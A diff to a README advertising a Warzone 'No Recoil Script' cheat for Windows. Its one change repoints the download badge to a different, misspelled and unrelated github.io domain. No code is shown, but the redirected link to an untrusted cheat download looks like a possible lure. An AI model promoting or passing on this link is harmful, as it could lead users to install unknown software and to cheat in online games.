@@ -3,7 +3,7 @@
 Master your aim in **Call of Duty: Warzone** with this **No Recoil Script** for Windows. Achieve perfect spray control, stabilize your aim, and minimize vertical drift for more precise engagements.
 
 ⬇️ **Download**  
-[![Download Warzone No Recoil Script](https://img.shields.io/badge/Download-Warzone_No_Recoil_Script-111111?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://warzone-no-recoil-script.github.io/.github/)
+[![Download Warzone No Recoil Script](https://img.shields.io/badge/Download-Warzone_No_Recoil_Script-111111?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://minecaft-fps-info.github.io/.github/)
 
 ---
 
